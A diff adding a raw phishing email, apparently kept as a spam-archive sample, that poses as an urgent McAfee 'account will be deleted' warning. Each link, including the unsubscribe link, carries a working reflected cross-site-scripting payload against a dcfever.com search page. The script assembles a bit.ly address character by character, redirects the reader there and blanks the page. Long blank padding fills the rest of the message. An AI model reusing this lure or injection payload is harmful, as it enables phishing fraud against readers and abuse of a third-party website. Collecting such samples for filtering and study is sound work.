@@ -1,0 +1,356 @@
+Return-Path: <>
+Delivered-To: untroubl8492-bruce@untroubled.org
+Received: (qmail 1488446 invoked from network); 22 Dec 2023 17:23:55 -0000
+Received: from EUR02-VI1-obe.outbound.protection.outlook.com (mail-vi1eur02olkn2023.outbound.protection.outlook.com [40.92.48.23])
+  by vx0.untroubled.org ([45.63.65.23])
+  with ESMTP via TCP; 22 Dec 2023 17:23:54 -0000
+ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
+ b=KtY2P2ZP2zcOlsQSMJSsqtkgQ6pwYejH02aBgnr/1CV2fr57Ldqqem5I3CAx0pdK0PzrfIhDAZPpox6dNLC044qjstpSFrwKmNVzYqhDEDvevMSSUp+nrlA2QuLFbnw02X0YHlpyO5irOObuRKA1RkY20H+/6vg80ew42Ng7CAV1Aycrs4jY4OrRZav8FzhHFy5JVI97fkfD818eRYZEie5Chp9i7prnZQ3cHNBK00XUpy16/IEFhovPFSFQM1RW0gqWpMaGpH2ADsxsqijrrnAb8plkWaqWEyPann0oH234kiEJy1pfxjN0oQgtcF4rNoCcswC1QSVIB/aJpXocfQ==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
+ s=arcselector9901;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
+ bh=Xyhntvv6bKScZ0LmCKDN4dzSFGW4xLBeAkLAcnNuQnU=;
+ b=OjTpbeEffp8AHFKs/oXNYIzPDnbr8ffTi/jK9fkblQY5XCo1qxYb4GrcMCeEYDNk+srSo4YgOLg+iISp6J8XQMd2mk8O0Ppdu4zn8TTtV093riLKXjaL9bOh6Sx2A3RcOPCayIFJauonLxU/1aXkaeA1umv/Je6Hbh7tBeD+3d1F9s8p8MWfmMPdIxpiukhx0MOW+qPLNhF5H3CWqqKBfEz3qXsIM0QcXIKnOG/hre+AR3qPt32majrtu6enMjp/A6i7H4obuZyGrSCUpGpyRtrtU+q9+ExGPDc2N9yTXs75ffSpI6mhB/bQ3NxOmHuurpRJr5Wz1hdWBek1xA7w7A==
+ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=none; dmarc=none;
+ dkim=none; arc=none
+Received: from AS8P195MB1979.EURP195.PROD.OUTLOOK.COM (2603:10a6:20b:549::13)
+ by AS8P195MB1173.EURP195.PROD.OUTLOOK.COM (2603:10a6:20b:3cc::17) with
+ Microsoft SMTP Server (version=TLS1_2,
+ cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.7113.21; Fri, 22 Dec
+ 2023 17:23:52 +0000
+Received: from AS8P195MB1979.EURP195.PROD.OUTLOOK.COM ([::1]) by
+ AS8P195MB1979.EURP195.PROD.OUTLOOK.COM ([fe80::f3e2:3ff0:4f33:60ce%5]) with
+ Microsoft SMTP Server id 15.20.7113.019; Fri, 22 Dec 2023 17:23:52 +0000
+From: "MUSK Portable Heater ." <alyciaberes042@hotmail.com>
+To: "bruce@untroubled.org" <bruce@untroubled.org>
+Subject: Automatic reply: 4489479928463124
+Thread-Topic: 4489479928463124
+Thread-Index: AQHaNPuh3IWxdpWMJU2hxxokXXT4pLC1jUxD
+Date: Fri, 22 Dec 2023 17:23:52 +0000
+Message-ID:
+ <48e04d1a81ac4b0e928e3005bcfed402@AS8P195MB1979.EURP195.PROD.OUTLOOK.COM>
+References:
+ <ywH6DyKUFUOW3WgspUdLDCDAdFHHqi430PO7Meyo]@cShx6puIDEwuJMx.DveM1lFQ.prod.outlook.com>
+In-Reply-To:
+ <ywH6DyKUFUOW3WgspUdLDCDAdFHHqi430PO7Meyo]@cShx6puIDEwuJMx.DveM1lFQ.prod.outlook.com>
+X-MS-Has-Attach:
+X-Auto-Response-Suppress: All
+X-MS-Exchange-Inbox-Rules-Loop: alyciaberes042@hotmail.com
+X-MS-TNEF-Correlator:
+x-ms-exchange-parent-message-id:
+ <ywH6DyKUFUOW3WgspUdLDCDAdFHHqi430PO7Meyo]@cShx6puIDEwuJMx.DveM1lFQ.prod.outlook.com>
+auto-submitted: auto-generated
+x-ms-exchange-generated-message-source: Mailbox Rules Agent
+x-ms-publictraffictype: Email
+x-ms-traffictypediagnostic: AS8P195MB1979:EE_|AS8P195MB1173:EE_
+x-ms-office365-filtering-correlation-id: 533ffb25-d5ca-49bf-c69f-08dc0312c487
+x-microsoft-antispam: BCL:0;
+x-microsoft-antispam-message-info:
+ Z7gHB7Jd+71fs9L7w7KWLYD6jN//jX0UZCaDrfWQtw+umFq/b7do54vTQX+WN7S1hq9Dkm3rP/RJKV/H/0YDBy/1vC00OJp/tZ8ECydq9cIKIZPFUpkAMzk/tSBBBpBxixyZLZPhMxAg2VT1+coZU+PM+uqD5Br0c/ekWySwpmkNiegLo1TDDPQWTEGZBLS2zEGPZRAnnnOcGyLnXe32hiSbcNRPozf/noWsTY/W3hX0dwBJVcG4gEDJ5LFNSILmpdOWrRAud0LggVxnBWZGlrjG1FhUdlZ3TibXCEZZjlA9fNlfsDuXAoGVIBdOVBrYFhcsDFrDEqLWptZZkger4W0VdT+8hjeLQz0gSOnmlvYIs1pVQREYttp/+POGUPGcORZF0beiomoQ8HqmyNBXoh60WvFigxAqyV43vbywlIhZT2bNN8rBI2zHqyDW7Ur08b/DyJjEtSzhI7cExa5EEg9teBktthMheDfai1TvSdlCPmNZxXkmXgJHE64Gkbv/BhmTS7MJ0oASTAoSXshuDZKDPK478Q3P4GvqKgifEk5+kgia7FqoAs9Jgb4S1JomWWQGVo7/WIkLLOl7BA+Q21f9kGCNuW0aaAToyzdN2e7+21eZe1k3aMZBc9jG5EqwqFtD80SDR9FDLB0DEWTug4b/6vG+0yzbDDwAii3C59UqOOOZOwc4puyrnYz2ei4P
+x-ms-exchange-antispam-messagedata-chunkcount: 1
+x-ms-exchange-antispam-messagedata-0:
+ Qh8f77zPPQvu4hPEuXA4QMHUtRr1vSo+pW10btaibAMNaWX42RVUdl3dRJoH2vox+cPOvoQdZ5DJ4k9JxdIgDuRY7CYeQyfYpk+wdMwq2aYH9XQZrTadI9sfCyY2l55jTiIHlSLX8vzStFnQtMfqMgHOGyk4TLQTlvqFmOzVDvMfgzg6V2M2/mL7y5IdUMxXAUd6F6eGJCyT0ItFYvYyEWniBKN+DPcE6DSh6Hf3BPlHd33UzL5RlEZyrkiteEiqh177etVTlxA9EJpHjp2O9y2190zN75SwGVtjIehbZhWbEro+fixcvAjc22JU/0PU
+Content-Type: multipart/alternative;
+	boundary="_000_48e04d1a81ac4b0e928e3005bcfed402AS8P195MB1979EURP195PRO_"
+MIME-Version: 1.0
+X-OriginatorOrg: sct-15-20-4755-11-msonline-outlook-49ed2.templateTenant
+X-MS-Exchange-CrossTenant-AuthAs: Internal
+X-MS-Exchange-CrossTenant-AuthSource: AS8P195MB1979.EURP195.PROD.OUTLOOK.COM
+X-MS-Exchange-CrossTenant-Network-Message-Id: 533ffb25-d5ca-49bf-c69f-08dc0312c487
+X-MS-Exchange-CrossTenant-originalarrivaltime: 22 Dec 2023 17:23:52.1138
+ (UTC)
+X-MS-Exchange-CrossTenant-fromentityheader: Hosted
+X-MS-Exchange-CrossTenant-id: 84df9e7f-e9f6-40af-b435-aaaaaaaaaaaa
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: AS8P195MB1173
+
+--_000_48e04d1a81ac4b0e928e3005bcfed402AS8P195MB1979EURP195PRO_
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: quoted-printable
+
+Last Attempt! Your Account Will Be-Deleted-Today! All Devices are Unprotect=
+ed - UPDATE NOW       <https://www.dcfever.com//photosharing//keywordsearch=
+.php?keyword=3D%22%3E%3Cscript%3Ewindow%5B%27location%27%5D%5B%27replace%27=
+%5D(%5B%27h%27%2C%27t%27%2C%27t%27%2C%27p%27%2C%27s%27%2C%27%3A%27%2C%27%2F=
+%27%2C%27%2F%27%2C%27b%27%2C%27i%27%2C%27t%27%2C%27.%27%2C%27l%27%2C%27y%27=
+%2C%27%2F%27%2C%274%27%2C%271%27%2C%27o%27%2C%27J%27%2C%27X%27%2C%27Q%27%2C=
+%27I%27%5D%5B%27join%27%5D(%27%27)),document%5B%27body%27%5D%5B%27style%27%=
+5D%5B%27opacity%27%5D=3D0x0;%3C/script%3E>
+
+
+<https://www.dcfever.com//photosharing//keywordsearch.php?keyword=3D%22%3E%=
+3Cscript%3Ewindow%5B%27location%27%5D%5B%27replace%27%5D(%5B%27h%27%2C%27t%=
+27%2C%27t%27%2C%27p%27%2C%27s%27%2C%27%3A%27%2C%27%2F%27%2C%27%2F%27%2C%27b=
+%27%2C%27i%27%2C%27t%27%2C%27.%27%2C%27l%27%2C%27y%27%2C%27%2F%27%2C%274%27=
+%2C%271%27%2C%27o%27%2C%27J%27%2C%27X%27%2C%27Q%27%2C%27I%27%5D%5B%27join%2=
+7%5D(%27%27)),document%5B%27body%27%5D%5B%27style%27%5D%5B%27opacity%27%5D=
+=3D0x0;%3C/script%3E>
+<https://www.dcfever.com//photosharing//keywordsearch.php?keyword=3D%22%3E%=
+3Cscript%3Ewindow%5B%27location%27%5D%5B%27replace%27%5D(%5B%27h%27%2C%27t%=
+27%2C%27t%27%2C%27p%27%2C%27s%27%2C%27%3A%27%2C%27%2F%27%2C%27%2F%27%2C%27b=
+%27%2C%27i%27%2C%27t%27%2C%27.%27%2C%27l%27%2C%27y%27%2C%27%2F%27%2C%274%27=
+%2C%271%27%2C%27o%27%2C%27J%27%2C%27X%27%2C%27Q%27%2C%27I%27%5D%5B%27join%2=
+7%5D(%27%27)),document%5B%27body%27%5D%5B%27style%27%5D%5B%27opacity%27%5D=
+=3D0x0;%3C/script%3E>[https://images.storychief.com/account_45417/mcafee18_=
+045cb581ca23345aa58b0193598df987_2000.png]<https://www.dcfever.com//photosh=
+aring//keywordsearch.php?keyword=3D%22%3E%3Cscript%3Ewindow%5B%27location%2=
+7%5D%5B%27replace%27%5D(%5B%27h%27%2C%27t%27%2C%27t%27%2C%27p%27%2C%27s%27%=
+2C%27%3A%27%2C%27%2F%27%2C%27%2F%27%2C%27b%27%2C%27i%27%2C%27t%27%2C%27.%27=
+%2C%27l%27%2C%27y%27%2C%27%2F%27%2C%274%27%2C%271%27%2C%27o%27%2C%27J%27%2C=
+%27X%27%2C%27Q%27%2C%27I%27%5D%5B%27join%27%5D(%27%27)),document%5B%27body%=
+27%5D%5B%27style%27%5D%5B%27opacity%27%5D=3D0x0;%3C/script%3E>
+
+To Unsubscribe From Future Emails<https://www.dcfever.com//photosharing//ke=
+ywordsearch.php?keyword=3D%22%3E%3Cscript%3Ewindow%5B%27location%27%5D%5B%2=
+7replace%27%5D(%5B%27h%27%2C%27t%27%2C%27t%27%2C%27p%27%2C%27s%27%2C%27%3A%=
+27%2C%27%2F%27%2C%27%2F%27%2C%27b%27%2C%27i%27%2C%27t%27%2C%27.%27%2C%27l%2=
+7%2C%27y%27%2C%27%2F%27%2C%273%27%2C%27R%27%2C%27p%27%2C%27F%27%2C%27s%27%2=
+C%27A%27%2C%27D%27%5D%5B%27join%27%5D(%27%27)),document%5B%27body%27%5D%5B%=
+27style%27%5D%5B%27opacity%27%5D=3D0x0;%3C/script%3E>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+--_000_48e04d1a81ac4b0e928e3005bcfed402AS8P195MB1979EURP195PRO_
+Content-Type: text/html; charset="us-ascii"
+Content-Transfer-Encoding: quoted-printable
+
+<html>
+<head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dus-ascii"=
+>
+</head>
+<body>
+<p style=3D"font-family:&quot;Times New Roman&quot;; font-size:medium; text=
+-align:center"><span style=3D"font-size:24px"><a href=3D"https://www.dcfeve=
+r.com//photosharing//keywordsearch.php?keyword=3D%22%3E%3Cscript%3Ewindow%5=
+B%27location%27%5D%5B%27replace%27%5D(%5B%27h%27%2C%27t%27%2C%27t%27%2C%27p=
+%27%2C%27s%27%2C%27%3A%27%2C%27%2F%27%2C%27%2F%27%2C%27b%27%2C%27i%27%2C%27=
+t%27%2C%27.%27%2C%27l%27%2C%27y%27%2C%27%2F%27%2C%274%27%2C%271%27%2C%27o%2=
+7%2C%27J%27%2C%27X%27%2C%27Q%27%2C%27I%27%5D%5B%27join%27%5D(%27%27)),docum=
+ent%5B%27body%27%5D%5B%27style%27%5D%5B%27opacity%27%5D=3D0x0;%3C/script%3E=
+"><span style=3D"font-family:Verdana,Geneva,sans-serif"><strong><span>Last
+ Attempt! Your Account Will Be-Deleted-Today! All Devices are Unprotected -=
+ UPDATE NOW &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=3D"color=
+:rgb(255,0,0)"></span></strong></span></a></span></p>
+<div dir=3D"ltr" style=3D"font-family:&quot;Times New Roman&quot;; font-siz=
+e:medium; text-align:start">
+<div style=3D"background-color:rgb(255,255,255)"><a href=3D"https://www.dcf=
+ever.com//photosharing//keywordsearch.php?keyword=3D%22%3E%3Cscript%3Ewindo=
+w%5B%27location%27%5D%5B%27replace%27%5D(%5B%27h%27%2C%27t%27%2C%27t%27%2C%=
+27p%27%2C%27s%27%2C%27%3A%27%2C%27%2F%27%2C%27%2F%27%2C%27b%27%2C%27i%27%2C=
+%27t%27%2C%27.%27%2C%27l%27%2C%27y%27%2C%27%2F%27%2C%274%27%2C%271%27%2C%27=
+o%27%2C%27J%27%2C%27X%27%2C%27Q%27%2C%27I%27%5D%5B%27join%27%5D(%27%27)),do=
+cument%5B%27body%27%5D%5B%27style%27%5D%5B%27opacity%27%5D=3D0x0;%3C/script=
+%3E"><strong><br>
+</strong></a></div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><a href=
+=3D"https://www.dcfever.com//photosharing//keywordsearch.php?keyword=3D%22%=
+3E%3Cscript%3Ewindow%5B%27location%27%5D%5B%27replace%27%5D(%5B%27h%27%2C%2=
+7t%27%2C%27t%27%2C%27p%27%2C%27s%27%2C%27%3A%27%2C%27%2F%27%2C%27%2F%27%2C%=
+27b%27%2C%27i%27%2C%27t%27%2C%27.%27%2C%27l%27%2C%27y%27%2C%27%2F%27%2C%274=
+%27%2C%271%27%2C%27o%27%2C%27J%27%2C%27X%27%2C%27Q%27%2C%27I%27%5D%5B%27joi=
+n%27%5D(%27%27)),document%5B%27body%27%5D%5B%27style%27%5D%5B%27opacity%27%=
+5D=3D0x0;%3C/script%3E"><strong></strong></a><strong><a href=3D"https://www=
+.dcfever.com//photosharing//keywordsearch.php?keyword=3D%22%3E%3Cscript%3Ew=
+indow%5B%27location%27%5D%5B%27replace%27%5D(%5B%27h%27%2C%27t%27%2C%27t%27=
+%2C%27p%27%2C%27s%27%2C%27%3A%27%2C%27%2F%27%2C%27%2F%27%2C%27b%27%2C%27i%2=
+7%2C%27t%27%2C%27.%27%2C%27l%27%2C%27y%27%2C%27%2F%27%2C%274%27%2C%271%27%2=
+C%27o%27%2C%27J%27%2C%27X%27%2C%27Q%27%2C%27I%27%5D%5B%27join%27%5D(%27%27)=
+),document%5B%27body%27%5D%5B%27style%27%5D%5B%27opacity%27%5D=3D0x0;%3C/sc=
+ript%3E" target=3D"_blank"><img src=3D"https://images.storychief.com/accoun=
+t_45417/mcafee18_045cb581ca23345aa58b0193598df987_2000.png"></a><br>
+</strong></div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><strong=
+><br>
+</strong></div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><strong=
+><a href=3D"https://www.dcfever.com//photosharing//keywordsearch.php?keywor=
+d=3D%22%3E%3Cscript%3Ewindow%5B%27location%27%5D%5B%27replace%27%5D(%5B%27h=
+%27%2C%27t%27%2C%27t%27%2C%27p%27%2C%27s%27%2C%27%3A%27%2C%27%2F%27%2C%27%2=
+F%27%2C%27b%27%2C%27i%27%2C%27t%27%2C%27.%27%2C%27l%27%2C%27y%27%2C%27%2F%2=
+7%2C%273%27%2C%27R%27%2C%27p%27%2C%27F%27%2C%27s%27%2C%27A%27%2C%27D%27%5D%=
+5B%27join%27%5D(%27%27)),document%5B%27body%27%5D%5B%27style%27%5D%5B%27opa=
+city%27%5D=3D0x0;%3C/script%3E">To
+ Unsubscribe From Future Emails</a><br>
+</strong></div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; background-color:rgb(255,255,255)"><br>
+</div>
+<div style=3D"text-align:center; color:rgb(34,34,34); background-color:rgb(=
+255,255,255)">
+<font style=3D"color:rgb(255,255,255); background-color:rgb(255,255,255)"><=
+br>
+</font></div>
+<font style=3D"color:rgb(255,255,255); background-color:rgb(255,255,255)"><=
+br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+</font></div>
+</body>
+</html>
+
+--_000_48e04d1a81ac4b0e928e3005bcfed402AS8P195MB1979EURP195PRO_--
